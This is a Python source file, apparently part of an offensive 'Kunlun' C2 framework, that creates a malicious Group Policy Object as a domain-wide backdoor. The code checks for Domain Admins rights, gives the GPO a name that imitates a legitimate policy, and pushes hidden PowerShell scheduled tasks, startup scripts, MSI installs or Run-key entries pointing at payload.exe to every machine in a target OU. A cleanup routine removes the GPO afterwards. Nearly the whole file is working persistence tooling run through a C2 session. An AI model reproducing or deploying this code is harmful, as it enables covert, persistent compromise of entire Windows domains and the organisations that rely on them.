"""GPO (Group Policy Object) backdoor module for Kunlun platform.

Provides:
- Malicious GPO creation and binding to target OU
- GPO push: scheduled tasks, startup scripts, MSI installation, registry modification
- GPO naming disguise (mimic default policy names)
- Cleanup support: delete malicious GPO and restore original configuration
"""

import asyncio
import logging
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class GPOBackdoorStatus(Enum):
    """GPO backdoor status."""
    NOT_CREATED = "not_created"
    CREATED = "created"
    LINKED = "linked"
    CLEANING = "cleaning"
    FAILED = "failed"


class GPOPayloadType(Enum):
    """GPO payload types."""
    SCHEDULED_TASK = "scheduled_task"
    STARTUP_SCRIPT = "startup_script"
    MSI_INSTALL = "msi_install"
    REGISTRY_MODIFY = "registry_modify"


@dataclass
class GPOConfig:
    """Configuration for GPO backdoor.

    Attributes:
        target_domain: Target domain
        target_ou: Target OU to link GPO
        gpo_name: GPO name (auto-generated if empty)
        disguise_name: Whether to use disguised name
        payload_type: Type of payload
        payload_data: Payload-specific data
        stealth_mode: Enable stealth mode
    """
    target_domain: str = ""
    target_ou: str = ""
    gpo_name: str = ""
    disguise_name: bool = True
    payload_type: GPOPayloadType = GPOPayloadType.STARTUP_SCRIPT
    payload_data: Dict[str, str] = field(default_factory=dict)
    stealth_mode: bool = False


@dataclass
class GPOResult:
    """Result of GPO backdoor operation.

    Attributes:
        success: Whether operation succeeded
        status: Current GPO status
        gpo_name: GPO name
        gpo_guid: GPO GUID
        linked_ou: Linked OU
        payload_applied: Whether payload was applied
        cleanup_success: Whether cleanup succeeded
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_domain: Target domain
    """
    success: bool = False
    status: GPOBackdoorStatus = GPOBackdoorStatus.NOT_CREATED
    gpo_name: str = ""
    gpo_guid: str = ""
    linked_ou: str = ""
    payload_applied: bool = False
    cleanup_success: bool = False
    error_message: str = ""
    attck_technique: str = "T1484.001"
    duration_seconds: float = 0.0
    target_domain: str = ""


class GPOBackdoor:
    """GPO backdoor module.

    Provides malicious GPO creation, payload push, naming disguise,
    and cleanup support for persistent domain access.
    """

    DISGUISE_NAMES: List[str] = [
        "Default Domain Policy Extension",
        "Windows Update Configuration",
        "Security Baseline Policy",
        "Domain Controller Policy",
        "Enterprise Security Settings",
        "System Configuration Update",
        "Network Policy Settings",
        "Authentication Policy Update",
    ]

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize GPO backdoor module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._original_gpo_config: Dict[str, Any] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("GPO Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("GPO: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_prerequisites(self, target_domain: str = "") -> Tuple[bool, List[str]]:
        """Check prerequisites for GPO backdoor.

        Args:
            target_domain: Target domain.

        Returns:
            Tuple of (can_create, issues).
        """
        issues: List[str] = []

        try:
            await self._report_log("检测GPO后门前置条件...")

            da_check = await self._execute_command(
                "net user %username% /domain"
            )
            if da_check.get("success"):
                output = str(da_check.get("output", ""))
                if "Group Policy Creator Owners" not in output and "Domain Admins" not in output:
                    issues.append("需要Domain Admins或Group Policy Creator Owners权限")

            gpo_check = await self._execute_command(
                "Get-GPO -Domain $env:USERDNSDOMAIN -All | Measure-Object | Select-Object -ExpandProperty Count"
            )
            if not gpo_check.get("success"):
                issues.append("无法访问GPO配置")

            return len(issues) == 0, issues

        except Exception as e:
            issues.append(f"前置检测异常: {e}")
            return False, issues

    async def create_gpo_backdoor(self, config: GPOConfig) -> GPOResult:
        """Create GPO backdoor.

        Args:
            config: GPO configuration.

        Returns:
            GPOResult with operation status.
        """
        start_time = time.time()
        result = GPOResult(target_domain=config.target_domain)

        try:
            await self._report_progress("检测前置条件", 5)

            can_create, issues = await self.check_prerequisites(config.target_domain)
            if not can_create:
                result.error_message = f"前置条件不满足: {', '.join(issues)}"
                result.status = GPOBackdoorStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            gpo_name = config.gpo_name if config.gpo_name else self._generate_disguised_name()
            result.gpo_name = gpo_name
            await self._report_log(f"GPO名称: {gpo_name}")

            await self._report_progress("创建GPO", 20)
            await self._report_log("开始创建恶意GPO...")

            created = await self._create_gpo(gpo_name, config.target_domain)
            if not created:
                result.error_message = "GPO创建失败"
                result.status = GPOBackdoorStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            result.status = GPOBackdoorStatus.CREATED
            await self._report_log("GPO创建成功")

            await self._report_progress("配置GPO载荷", 40)
            await self._report_log("配置GPO载荷...")

            payload_result = await self._configure_payload(
                gpo_name,
                config.payload_type,
                config.payload_data,
                config.target_domain,
            )
            if not payload_result.get("success"):
                result.error_message = "GPO载荷配置失败"
                result.status = GPOBackdoorStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_progress("链接GPO到目标OU", 70)
            await self._report_log(f"链接GPO到OU: {config.target_ou}")

            linked = await self._link_gpo_to_ou(
                gpo_name,
                config.target_ou,
                config.target_domain,
            )
            if linked:
                result.linked_ou = config.target_ou
                result.status = GPOBackdoorStatus.LINKED
                result.payload_applied = True
                await self._report_log("GPO链接成功")
            else:
                await self._report_log("警告: GPO链接失败，但GPO已创建")

            result.success = True
            result.duration_seconds = time.time() - start_time

            await self._report_progress("完成", 100)
            await self._report_log("GPO后门创建成功!")

            await self._broadcast_event(result, config)

        except Exception as e:
            result.error_message = str(e)
            result.status = GPOBackdoorStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"GPO后门创建失败: {e}")
            logger.error("GPO backdoor creation failed: %s", e)

        return result

    async def _create_gpo(self, gpo_name: str, target_domain: str) -> bool:
        """Create GPO.

        Args:
            gpo_name: GPO name.
            target_domain: Target domain.

        Returns:
            True if creation successful.
        """
        try:
            cmd = f"New-GPO -Name \"{gpo_name}\" -Domain \"{target_domain}\""
            exec_result = await self._execute_command(cmd)

            if exec_result.get("success"):
                output = str(exec_result.get("output", ""))
                for line in output.split("\n"):
                    if "Id" in line or "GUID" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            self._original_gpo_config["gpo_guid"] = parts[-1].strip()
                            break

            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("GPO creation failed: %s", e)
            return False

    async def _configure_payload(
        self,
        gpo_name: str,
        payload_type: GPOPayloadType,
        payload_data: Dict[str, str],
        target_domain: str,
    ) -> Dict[str, Any]:
        """Configure GPO payload.

        Args:
            gpo_name: GPO name.
            payload_type: Payload type.
            payload_data: Payload data.
            target_domain: Target domain.

        Returns:
            Payload configuration result.
        """
        try:
            if payload_type == GPOPayloadType.SCHEDULED_TASK:
                return await self._configure_scheduled_task(gpo_name, payload_data, target_domain)
            elif payload_type == GPOPayloadType.STARTUP_SCRIPT:
                return await self._configure_startup_script(gpo_name, payload_data, target_domain)
            elif payload_type == GPOPayloadType.MSI_INSTALL:
                return await self._configure_msi_install(gpo_name, payload_data, target_domain)
            elif payload_type == GPOPayloadType.REGISTRY_MODIFY:
                return await self._configure_registry_modify(gpo_name, payload_data, target_domain)
            return {"success": False, "error": "Unknown payload type"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _configure_scheduled_task(
        self,
        gpo_name: str,
        payload_data: Dict[str, str],
        target_domain: str,
    ) -> Dict[str, Any]:
        """Configure scheduled task payload.

        Args:
            gpo_name: GPO name.
            payload_data: Payload data.
            target_domain: Target domain.

        Returns:
            Configuration result.
        """
        try:
            task_name = payload_data.get("task_name", "WindowsUpdateTask")
            action = payload_data.get("action", "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\\share\\script.ps1")
            trigger = payload_data.get("trigger", "AtStartup")

            cmd = (
                f"Set-GPPrefScheduledTask -GPOName \"{gpo_name}\" "
                f"-TaskName \"{task_name}\" -Action \"{action}\" "
                f"-Trigger \"{trigger}\""
            )
            result = await self._execute_command(cmd)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _configure_startup_script(
        self,
        gpo_name: str,
        payload_data: Dict[str, str],
        target_domain: str,
    ) -> Dict[str, Any]:
        """Configure startup script payload.

        Args:
            gpo_name: GPO name.
            payload_data: Payload data.
            target_domain: Target domain.

        Returns:
            Configuration result.
        """
        try:
            script_path = payload_data.get("script_path", "\\\\share\\startup.bat")

            cmd = (
                f"Set-GPRegistryValue -Name \"{gpo_name}\" "
                f"-Key \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\\0\\0\" "
                f"-ValueName Script -Value \"{script_path}\""
            )
            result = await self._execute_command(cmd)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _configure_msi_install(
        self,
        gpo_name: str,
        payload_data: Dict[str, str],
        target_domain: str,
    ) -> Dict[str, Any]:
        """Configure MSI installation payload.

        Args:
            gpo_name: GPO name.
            payload_data: Payload data.
            target_domain: Target domain.

        Returns:
            Configuration result.
        """
        try:
            msi_path = payload_data.get("msi_path", "\\\\share\\software.msi")

            cmd = (
                f"New-GPSoftwareDistribution -GPOName \"{gpo_name}\" "
                f"-Path \"{msi_path}\""
            )
            result = await self._execute_command(cmd)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _configure_registry_modify(
        self,
        gpo_name: str,
        payload_data: Dict[str, str],
        target_domain: str,
    ) -> Dict[str, Any]:
        """Configure registry modification payload.

        Args:
            gpo_name: GPO name.
            payload_data: Payload data.
            target_domain: Target domain.

        Returns:
            Configuration result.
        """
        try:
            key = payload_data.get("registry_key", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
            value_name = payload_data.get("value_name", "WindowsUpdate")
            value_data = payload_data.get("value_data", "C:\\Windows\\System32\\payload.exe")

            cmd = (
                f"Set-GPRegistryValue -Name \"{gpo_name}\" "
                f"-Key \"{key}\" "
                f"-ValueName \"{value_name}\" "
                f"-Value \"{value_data}\""
            )
            result = await self._execute_command(cmd)
            return {"success": result.get("success", False)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _link_gpo_to_ou(
        self,
        gpo_name: str,
        target_ou: str,
        target_domain: str,
    ) -> bool:
        """Link GPO to target OU.

        Args:
            gpo_name: GPO name.
            target_ou: Target OU.
            target_domain: Target domain.

        Returns:
            True if linking successful.
        """
        try:
            cmd = (
                f"New-GPLink -Name \"{gpo_name}\" "
                f"-Target \"{target_ou}\" "
                f"-Domain \"{target_domain}\""
            )
            exec_result = await self._execute_command(cmd)
            return bool(exec_result.get("success", False))
        except Exception as e:
            logger.error("GPO linking failed: %s", e)
            return False

    async def cleanup_gpo_backdoor(self, gpo_name: str = "", target_domain: str = "") -> bool:
        """Cleanup GPO backdoor.

        Args:
            gpo_name: GPO name to clean up.
            target_domain: Target domain.

        Returns:
            True if cleanup successful.
        """
        try:
            await self._report_log(f"开始清理GPO后门: {gpo_name}")

            if not gpo_name:
                await self._report_log("错误: 未指定GPO名称")
                return False

            await self._report_log("删除GPO链接...")
            unlink_cmd = f"Remove-GPLink -Name \"{gpo_name}\" -Domain \"{target_domain}\""
            await self._execute_command(unlink_cmd)

            await self._report_log("删除GPO...")
            delete_cmd = f"Remove-GPO -Name \"{gpo_name}\" -Domain \"{target_domain}\""
            result = await self._execute_command(delete_cmd)

            if result.get("success"):
                await self._report_log("GPO后门清理成功")
                return True
            else:
                await self._report_log("警告: GPO删除失败")
                return False

        except Exception as e:
            logger.error("GPO backdoor cleanup failed: %s", e)
            return False

    def _generate_disguised_name(self) -> str:
        """Generate disguised GPO name.

        Returns:
            Disguised GPO name.
        """
        base_name = self.DISGUISE_NAMES[hash(str(uuid.uuid4())) % len(self.DISGUISE_NAMES)]
        suffix = str(uuid.uuid4())[:6].upper()
        return f"{base_name} {suffix}"

    async def _broadcast_event(self, result: GPOResult, config: GPOConfig) -> None:
        """Broadcast GPO backdoor event.

        Args:
            result: GPO result.
            config: GPO configuration.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "gpo_backdoor",
                "success": result.success,
                "target_domain": result.target_domain,
                "gpo_name": result.gpo_name,
                "linked_ou": result.linked_ou,
                "payload_applied": result.payload_applied,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast GPO event: %s", e)
